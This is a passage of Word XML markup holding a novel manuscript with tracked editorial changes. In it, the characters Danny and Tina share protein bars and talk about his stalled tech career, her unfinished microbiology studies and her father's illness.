            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">one </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>in each hand</w:t>
      </w:r>
      <w:del w:id="1724" w:author="TextVet" w:date="2016-03-19T14:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DF098A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in front of Tina</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Which one’s better for me? The Cool Mint Chocolate, or another Crunchy Peanut Butter?”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should I know?” said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shrugged. “I don’t know. You seem to know what you’re doing when it comes to, like, medical…, you know, biological, organic… doohickeys. I know they just </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>have you working at this biotech company as an office admin, but you seem good at this stuff.”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was momentarily</w:t>
      </w:r>
      <w:ins w:id="1725" w:author="TextVet" w:date="2016-03-19T14:48:00Z">
        <w:r w:rsidR="00480A7C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, delightfully</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> stunned</w:t>
      </w:r>
      <w:del w:id="1726" w:author="TextVet" w:date="2016-03-19T14:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00480A7C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> into delighted silence</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Well,” she</w:t>
      </w:r>
      <w:del w:id="1727" w:author="TextVet" w:date="2016-03-19T14:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00717FA9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> said with a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="1728" w:author="TextVet" w:date="2016-03-19T14:47:00Z">
        <w:r w:rsidR="00717FA9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>beamed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1729" w:author="TextVet" w:date="2016-03-19T14:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00717FA9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>smile</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, “I personally happen to be a fan of Cool Mint Chocolate…”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exaggerated graciousness, he extended the package to her. “Join me for dinner?”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“Sure.” She half-sat against a closed checkout counter and peeled open the wrapper.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ripped the Peanut Butter Crunch package open with his teeth and immediately bit off a chunk of the chewy protein bar inside.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really love that Peanut Butter there, don’t you?” she mused.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“Mmmm…” he said while chewing. “It’s good, but… I could use something to wash it down with</w:t>
      </w:r>
      <w:ins w:id="1730" w:author="TextVet" w:date="2016-03-19T14:53:00Z">
        <w:r w:rsidR="000C21A3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1731" w:author="TextVet" w:date="2016-03-19T14:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000C21A3">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732" w:author="TextVet" w:date="2016-03-19T14:53:00Z">
        <w:r w:rsidR="000C21A3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>m</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1733" w:author="TextVet" w:date="2016-03-19T14:53:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000C21A3">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>M</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>aybe some OJ?”</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watched him scarf down his second Peanut Butter Crunch bar while she took her time with her Cool Mint Chocolate.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w:t>
      </w:r>
      <w:del w:id="1734" w:author="TextVet" w:date="2016-03-19T14:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B1CE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1735" w:author="TextVet" w:date="2016-03-19T14:54:00Z">
        <w:r w:rsidR="008B1CE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>…</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1736" w:author="TextVet" w:date="2016-03-19T14:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B1CE4">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Danny…” she said between slow bites.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“Hrmm?”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 the hell are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question made him suddenly </w:t>
      </w:r>
      <w:del w:id="1737" w:author="TextVet" w:date="2016-03-19T14:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008B1CE4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">appear </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sullen. He slowed his chewing and stared at the floor. “I’m just a guy.”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tech wizard guy?”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failed one, maybe.”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“Aww. A genius computer hacker guy, then?”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“Heh, right. In some alternate reality.”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what kind of guy do you consider yourself to be?” she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thought for a moment. “I’m not sure. I don’t think about it much. I guess I spend so much time thinking about who I’d </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>like</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to be, or who I believe I’m </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>supposed</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to be, that I never think much about who I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>am</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who do you believe you’re supposed to be?”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“Heh. I’m </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>supposed</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to be an astounding technologist,” he said. “I’m supposed to be Thomas Edison or Nikola Tesla. Or Bill Gates or Steve Jobs or Larry Page or Mark Zuckerberg. I’m supposed to be young and brilliant and everybody’s supposed to be in awe of my genius.”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nibbled on her Clif Bar. “Hmm. So you’re saying you believe the world should revolve around you, then. Noted…”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not that I believe it </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>should</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” he said with a self-deprecating smile, “It’s just that I certainly wouldn’t complain if it did.”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smiled </w:t>
      </w:r>
      <w:del w:id="1738" w:author="TextVet" w:date="2016-03-19T14:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AC0572">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">back </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>through another bite</w:t>
      </w:r>
      <w:del w:id="1739" w:author="TextVet" w:date="2016-03-19T14:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E377E1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of her Clif Bar</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:del w:id="1740" w:author="TextVet" w:date="2016-03-19T14:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00453A2E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">her </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eyes twinkling.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“All I mean,” Danny continued, “is that I want to be responsible for shaping the world I live in. Take something that’s inside me, in my mind, and use it to help define our reality. I feel like I was supposed to have done it a long time ago. I was in the right field at the right time. I had the right skills and the right talents. And now here I am, pushing forty, and I’m like, ‘What the fuck happened?’ Did I miss my exit on the highway or something? It’s like I’m off course. Like there’s this whole other life that I’m supposed to be living, right this minute, in some alternate reality… And instead I’m… here. Does that make any sense?”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it does,” said Tina. “More than you know.”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what about you?”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“What about me?” she returned, </w:t>
      </w:r>
      <w:del w:id="1741" w:author="TextVet" w:date="2016-03-19T14:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0033316F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with a </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wiggl</w:t>
      </w:r>
      <w:ins w:id="1742" w:author="TextVet" w:date="2016-03-19T14:57:00Z">
        <w:r w:rsidR="0033316F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1743" w:author="TextVet" w:date="2016-03-19T14:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0033316F">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did you learn biotechnology? Did you absorb it through osmosis at Tungsten?”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Her cheeks </w:t>
      </w:r>
      <w:ins w:id="1744" w:author="TextVet" w:date="2016-03-19T15:27:00Z">
        <w:r w:rsidR="0012731A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>pinked</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1745" w:author="TextVet" w:date="2016-03-19T15:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00212B8A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>turn</w:delText>
        </w:r>
        <w:r w:rsidRPr="000D3488" w:rsidDel="0012731A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ed slightly</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1746" w:author="TextVet" w:date="2016-03-19T15:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00212B8A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> rosy</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. “I might have picked up a thing or two… The truth is, </w:t>
      </w:r>
      <w:del w:id="1747" w:author="TextVet" w:date="2016-03-19T15:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D22895">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the only reason </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">I </w:t>
      </w:r>
      <w:ins w:id="1748" w:author="TextVet" w:date="2016-03-19T15:29:00Z">
        <w:r w:rsidR="00D22895">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>only started</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1749" w:author="TextVet" w:date="2016-03-19T15:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D22895">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>went to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> work</w:t>
      </w:r>
      <w:ins w:id="1750" w:author="TextVet" w:date="2016-03-19T15:29:00Z">
        <w:r w:rsidR="00D22895">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at Tungsten </w:t>
      </w:r>
      <w:del w:id="1751" w:author="TextVet" w:date="2016-03-19T15:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D22895">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>because it’s such a small company</w:t>
      </w:r>
      <w:ins w:id="1752" w:author="TextVet" w:date="2016-03-19T15:29:00Z">
        <w:r w:rsidR="00D22895">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I figured there’d be a chance they’d let the office admin migrate into a research position. It was a long shot, but it was worth taking.”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you intended to go into research from the start?”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 “I studied microbiology in college. I wanted to work on cures for infectious diseases. You know, like MRSA or tuberculosis.”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blinked. “They have you working as a receptionist with a degree in microbiology?”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looked away. “I never finished. My junior year, my dad got really sick…”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ventured, “Tuberculosis?”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shook her head. “That would be poetic, wouldn’t it? But</w:t>
      </w:r>
      <w:ins w:id="1753" w:author="TextVet" w:date="2016-03-19T15:30:00Z">
        <w:r w:rsidR="001712FE">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no</w:t>
      </w:r>
      <w:ins w:id="1754" w:author="TextVet" w:date="2016-03-19T15:30:00Z">
        <w:r w:rsidR="001712FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>;</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1755" w:author="TextVet" w:date="2016-03-19T15:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001712FE">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756" w:author="TextVet" w:date="2016-03-19T15:30:00Z">
        <w:r w:rsidR="001712FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>e</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1757" w:author="TextVet" w:date="2016-03-19T15:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001712FE">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arly-onset Parkinson’s</w:t>
      </w:r>
      <w:ins w:id="1758" w:author="TextVet" w:date="2016-03-19T15:31:00Z">
        <w:r w:rsidR="001712FE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1759" w:author="TextVet" w:date="2016-03-19T15:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001712FE">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760" w:author="TextVet" w:date="2016-03-19T15:31:00Z">
        <w:r w:rsidR="00566952" w:rsidRPr="00566952">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="1761" w:author="TextVet" w:date="2016-03-19T15:31:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>v</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1762" w:author="TextVet" w:date="2016-03-19T15:31:00Z">
        <w:r w:rsidR="00566952" w:rsidRPr="00566952">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="1763" w:author="TextVet" w:date="2016-03-19T15:31:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText>V</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1764" w:author="TextVet" w:date="2016-03-19T15:31:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>ery</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> rapid progression. I moved back here to Seattle to help take care of him. And my mom had a really hard time coping, especially after he passed away… So, yeah, when you talk about life veering you down a track you hadn’t intended…”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“Especially when that track involves Russian hitmen,” Danny added.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shuddered. “Yeah. God. The less of those I have to see from now on, the better. You know, it’s bad enough that the guy held me at gunpoint and tried to drag me off to his hideout… but you know what </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>really</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> upset me? The guy was texting on his cellphone the whole time!”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laughed. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
